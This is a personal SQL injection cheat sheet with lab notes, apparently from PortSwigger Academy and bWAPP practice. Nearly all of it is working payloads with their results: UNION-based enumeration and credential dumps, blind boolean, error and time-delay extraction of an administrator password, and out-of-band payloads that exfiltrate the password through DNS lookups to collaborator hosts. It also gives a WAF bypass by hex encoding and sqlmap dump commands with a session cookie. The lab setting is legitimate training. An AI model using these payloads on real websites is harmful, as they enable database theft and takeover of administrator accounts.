https://insecure-website.com/products?category=Gifts'--
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
https://insecure-website.com/products?category=Gifts'+OR+1=1--
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1


Determine the number of columns:
-----------------------------------

' ORDER BY 3 --                       (if you increse the number and you get an error so yeah you would know the number of coulmns)
' UNION SELECT NULL, NULL, NULL --    (same here!)



Determine the data type of the columns:
------------------------------------------

' UNION SELECT NULL, 'testString', NULL --         (test the NULL values to see which one is compatible with string data)
' UNION SELECT 'testString', 'testString' FROM DUAL--  (Oracle Database)


Dump from the Database:
------------------------

' UNION SELECT username, password FROM users--


String Concatanation:
----------------------

' UNION SELECT NULL, username|| ':' ||password FROM users--


Examining the database (Enum):
--------------------------------

SELECT * FROM v$version
SELECT * FROM information_schema.tables

SELECT table_name FROM information_schema.tables



Microsoft, MySQL		SELECT @@version
Oracle					SELECT * FROM v$version
PostgreSQL				SELECT version()

Oracle 	SELECT banner FROM v$version
SELECT version FROM v$instance
Microsoft 	SELECT @@version
PostgreSQL 	SELECT version()
MySQL 	SELECT @@version


' UNION SELECT @@version--
' UNION SELECT NULL, @@version#





Listing the contents of the database:
----------------------------------------

SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT NULL, column_name from information_schema.columns where table_name='users_fpgfub'--
' UNION SELECT username_twajre, password_gqfbcu from users_fpgfub--








**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************





Obvious Steps:
-----------------


End Goals:
- Determine the table that contains usernames and passwords
- Determine the relevant columns
- Output the content of the table
- Login as the administrator user

Analysis:

1. Find the number of columns
' order by 3-- -> Internal server error
3 - 1 = 2

2. Find the data type of the columns
' UNION select 'a', 'a'--  -> both columns accept type text

3. Version of the database
' UNION SELECT @@version, NULL-- -> not Microsoft
' UNION SELECT version(), NULL-- -> 200 OK
PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1)

PostgreSQL:
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'


4. Output the list of table names in the database
Google on information_schema postgres to know the availiable things that you can select from the information schema and here we know that table_name is that one we need first!

' UNION SELECT table_name, NULL FROM information_schema.tables--

table_name  ==>  users_xacgsm

5. Output the column names of the table

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'--

column_name  ==>  username_pxqwui
column_name  ==>  password_bfvoxs

6. Output the usernames and passwords

' UNION select username_pxqwui, password_bfvoxs from users_xacgsm--




**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************
**********************************************************************************************************************************



Oracle Database:
-------------------

Oracle 	SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

' UNION SELECT NULL, table_name FROM all_tables--

USERS_ZZLBGP

' UNION SELECT NULL, COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS_ZZLBGP'--


USERNAME_DKHPZW
PASSWORD_WYPNKQ

' UNION SELECT USERNAME_DKHPZW, PASSWORD_WYPNKQ FROM USERS_ZZLBGP--


administrator
3suv6gw6no1l03w5b3h6



Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
Oracle 	SUBSTR('foobar', 4, 2)
Microsoft 	SUBSTRING('foobar', 4, 2)
PostgreSQL 	SUBSTRING('foobar', 4, 2)
MySQL 	SUBSTRING('foobar', 4, 2) 







Blind SQL injection:
------------------------
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba. 

Oracle 	SUBSTR('foobar', 4, 2)
Microsoft 	SUBSTRING('foobar', 4, 2)
PostgreSQL 	SUBSTRING('foobar', 4, 2)
MySQL 	SUBSTRING('foobar', 4, 2) 


1) For simplicity, let's say the original value of the cookie is TrackingId=xyz.

2) Modify the TrackingId cookie, changing it to:
TrackingId=xyz' AND '1'='1
Verify that the "Welcome back" message appears in the response.

3)Now change it to:
TrackingId=xyz' AND '1'='2
Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.



TrackingId=n9OYgbWsaktJZzR4' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'e
TrackingId=n9OYgbWsaktJZzR4' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'y
TrackingId=n9OYgbWsaktJZzR4' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = '7;
TrackingId=n9OYgbWsaktJZzR4' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 4, 1) = 'v;



Lab 11 - Blind SQL injection with conditional responses

Vulnerable parameter - tracking cookie

End Goals:
1) Enumerate the password of the administrator
2) Log in as the administrator user

Analysis:

1) Confirm that the parameter is vulnerable to blind SQLi

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'

-> If this tracking id exists -> query returns value -> Welcome back message
-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
-> TRUE -> Welcome back

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
-> FALSE -> no Welcome back

2) Confirm that we have a users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
-> users table exists in the database.

3) Confirm that username administrator exists users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
-> administrator user exists

4) Enumerate the password of the administrator user

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
-> password is exactly 20 characters

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'


1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
tlsgdtaa648two4oprpu




Lab 12 - Blind SQL injection by triggering conditional errors


Vulnerable parameter - tracking cookie

End Goals:
- Output the administrator password
- Login as the administrator user

Analysis:

1) Prove that parameter is vulnerable

TrackingId=T8rzSW7T92AhBP18';    ==> Trying single quote and it gives an 5OO Internal Server Error so that means that it's possible to Blind SQLI by triggering conditional errors but we need to fix the query to ensure that!

TrackingId=T8rzSW7T92AhBP18'';   ==> when closing the quote which make it well sql query it gives 200OK which indicate that there's SQLI here!


' || (select '') || '  gives an error which indicates it's not MSSQL or mysql

' || (select '' from dual) || '   200OK	-> oracle database

' || (select '' from dualfiewjfow) || ' 	-> error


2) Confirm that the users table exists in the database

TrackingId=T8rzSW7T92AhBP18' || (SELECT '' FROM users WHERE rownum=1) || '
-> users table exists


3) Confirm that the administrator user exists in the users table

TrackingId=T8rzSW7T92AhBP18' || (SELECT username FROM users WHERE username="administrator")="administrator" || '  -> error cuz you are here concatenate the administrator string with the sql query, so let's try another technique by concatenate empty string to not affect the Value of the cookie!


TrackingId=T8rzSW7T92AhBP18' || (SELECT '' FROM users WHERE username='administrator') || '   -> there we go 200OK

but when we tried:

TrackingId=T8rzSW7T92AhBP18' || (SELECT '' FROM users WHERE username='sdnfdsjkfjkds') || '   -> still gives 200OK cuz if the user didn't exist in the database it won't execute the SELECT Statment so we need another techique to diffrentiate the output and determine if the user administrator acutally on the database or not! :(


keep your mind thinkable, cuz i tried -- in the beginning of 200OK query and it still gives me 200OK which means that there's a filter removes the - character ;)


' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '   ==> if it gives an error this means that it execute the 1/0 Correctly and it's pretty obvious it's a Blind SQLI based on conditional errors!

' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '   ==> now it execute the ELSE condition and didn't throw an error and gives 200OK, nice, let's play with it more and more!


' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
-> Internal server error -> thie means that the administrator user exists cuz the structure of the query that FROM word would execute first and it's executed successfully so the SELECT statment would execute so if the SELECT Statment throw an error from the TO_CHAR function that means that the administrator user exist on the Database!


' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
-> 200 response -> user does not exist in database cuz the SELECT query didn't execute cuz the FROM users word is false from the begining


4) Determine length of password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>10) || '
-> 200OK Which means that the length of the password is bigger than 10 actually and after some tries we know that the length of the password is 20 and when we did:

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)=20) || '
-> Internal server error -> thie means that length of the password is 20






Lab 13 - Visible error-based SQL injection

Extracting sensitive data via verbose SQL error messages

CAST((SELECT example_column FROM example_table) AS int)

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:
ERROR: invalid input syntax for type integer: "Example data"

This type of query may also be useful in cases where you're unable to trigger conditional responses because of a character limit imposed on the query. 




TrackingId=ogAZZfxtOKUELbuJ'
TrackingId=ogAZZfxtOKUELbuJ'--
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
ERROR: invalid input syntax for type integer: "administrator"
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--







Lab 13 - Blind SQL injection with time delays

On Microsoft SQL Server:
	
'; IF (1=1) WAITFOR DELAY '0:0:10'--
The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second input will trigger a delay of 10 seconds, because the condition 1=1 is true. 


Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time: 
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--


Time delays:
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

Oracle 	       dbms_pipe.receive_message(('a'),10)
Microsoft 	   WAITFOR DELAY '0:0:10'
PostgreSQL 	   SELECT pg_sleep(10)
MySQL 	       SELECT SLEEP(10)


End Goal:
- to prove that the field is vulnerable to blind SQLi (time based)

Analysis:

select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';

' || (SELECT sleep(10))-- -x
' || (SELECT pg_sleep(10))--       ==> it worked so it's PostgreSQL Database :)






' IF (SELECT count(username) FROM users WHERE username='administrator' and SUBSTRING(password, 1, 1) > 'm') = 1 then pg_sleep(10);--




Lab 14 - Blind SQLi with time delays and informational retrieval



Vulnerable parameter - tracking cookie

End Goals:
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

Analysis:

1) Confirm that the parameter is vulnerable to SQLi

' || pg_sleep(10)--

2) Confirm that the users table exists in the database

' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--

' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--

3) Enumerate the password length

' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
-> length of password is 20 characters

4) Enumerate the administrator password

' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--







Blind SQL injection with out-of-band interaction:



The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

This will cause the database to perform a lookup for the following domain:
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net




' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ydfn9ciyi2d6legja8tvtpmmedk48vwk.oastify.com/"> %remote;]>'),'/l') FROM dual) --



'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.ydfn9ciyi2d6legja8tvtpmmedk48vwk.oastify.com/a"')--


' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.bds09pibifdjlrgwalt8t2mzeqkh8awz.oastify.com/"> %remote;]>'),'/l') FROM dual) -- 


after poll from collaborator   ===>     kv2jevefv9oma9i7xifl.bds09pibifdjlrgwalt8t2mzeqkh8awz.oastify.com
the first part before . is the password of the administrator










Lab: SQL injection with filter bypass via XML encoding



<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			1 UNION SELECT NULL
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>


Adding UNION SELECT NULL and trigger the output and we find "Attack detected"

so yeah it's diffently there's a WAF Preventing US!

so let's use the Hackvertor Extention to encode the payload to something like Hex entites.

and select all of the payload and click+Right and encode it with the Extention bro, all of it in the burpsuite :) 

<@hex_entities>
	1 UNION (SELECT username || ':' || password FROM users)
<@/hex_entities>











BWAPP:
--------

' UNION SELECT 'TEST1', table_name, 'TEST3', 'TEST4', 'TEST5' ,'TEST6', 'TEST7' FROM INFORMATION_SCHEMA.TABLES -- -

' UNION SELECT 'TEST1', column_name, 'TEST3', 'TEST4', 'TEST5' ,'TEST6', 'TEST7' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'-- -

Ir%'+UNION+ALL+SELECT+'TEST1',+id,+login,+email,+password+,'TEST6',+'TEST7'+FROM+users+--+-

10 UNION ALL SELECT NULL, table_schema, table_name, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.TABLES LIMIT 1 OFFSET 1;-- -

' UNION SELECT 'test1',admin,login,password,email,'test6','test7' FROM users LIMIT 1 OFFSET1;-- -

wor%'+UNION+SELECT+'TEST2',id,login,password,email,'TEST7','TEST8'+FROM+users+--+-

a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--

ok' or 1=1-- 

a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --

W%' UNION ALL SELECT 'TEST1',sqlite_version(),'TEST3','TEST4','TEST5','TEST6'-- -

Stored (Blog):
something',(SELECT+DATABASE()+))+--+-
To begin enumerating tables:
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 0,1  ))-- 
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 1,1  ))-- 
8888',(SELECT+COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME='users'+LIMIT+1,1+))+--+-
331',(SELECT+login+FROM+users+LIMIT+1))+--+-
22',(SELECT+password+FROM+users+LIMIT+1))+--+-



Stored (User-Agent):
somthing','SOMETHING')#
somthing',(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='bWAPP' LIMIT 3,1 ))#
somthing',(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1 ))#
somthing',(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 1,1 ))#
somthing',(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 2,1 ))#
somthing',(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 3,1 ))#
somthing',(SELECT CONCAT(login, ':', password) FROM users LIMIT 1 ))#
somthing',(SELECT CONCAT(password) FROM users LIMIT 1 ))#
somthing',(SELECT CONCAT(login, '::', login, '::', email, '::', password) FROM users LIMIT 1 ))#






Blind Boolean Based:
WO%'+OR+1=1+AND+database()='bWAPP'+%23+--+-
WO%'+OR+1=1+AND+SUBSTRING((SELECT+password+FROM+users+LIMIT+1),+1,+1)%3d'6'+%23+--+-
Checkout my python script on GitHub ;)





Blind Time-Based:

sudo sqlmap -u "http://192.168.1.9/bWAPP/sqli_15.php?title=&action=search" --cookie="security_level=0;PHPSESSID=485dc6d1f49f6d1565cf2a195b0512e6" -p title --threads=5 --level=5 --risk=3 --batch --dbs


sudo sqlmap -u "http://192.168.1.9/bWAPP/sqli_15.php?title=&action=search" --cookie="security_level=0;PHPSESSID=485dc6d1f49f6d1565cf2a195b0512e6" -p title --threads=5 --level=5 --risk=3 --batch -D "bWAPP" --tables


sudo sqlmap -u "http://192.168.1.9/bWAPP/sqli_15.php?title=&action=search" --cookie="security_level=0;PHPSESSID=485dc6d1f49f6d1565cf2a195b0512e6" -p title --threads=5 --level=5 --risk=3 --batch -T "users" --columns


sudo sqlmap -u "http://192.168.1.9/bWAPP/sqli_15.php?title=&action=search" --cookie="security_level=0;PHPSESSID=485dc6d1f49f6d1565cf2a195b0512e6" -p title --threads=5 --level=5 --risk=3 --dump --tables --columns -T "users"


sudo sqlmap -u "http://192.168.1.9/bWAPP/sqli_15.php?title=&action=search" --cookie="security_level=0;PHPSESSID=485dc6d1f49f6d1565cf2a195b0512e6" -p title --threads=5 --level=5 --risk=3 -T "users" --dump






Blind SQLite:

sudo sqlmap -u "http://192.168.1.9/bWAPP/sqli_14.php?title=&action=search" --cookie="security_level=0;PHPSESSID=485dc6d1f49f6d1565cf2a195b0512e6" -p title --dbms=sqlite --threads=5 --level=5 --risk=3 --hex --tables --dbs



sudo sqlmap -u "http://192.168.1.9/bWAPP/sqli_14.php?title=&action=search" --cookie="security_level=0;PHPSESSID=485dc6d1f49f6d1565cf2a195b0512e6" -p title --dbms=SQLite --threads=5 --level=5 --risk=3 --tables --columns -T 'users' --dump





XML/XPath Injection (Login Form):

password=' or id='2



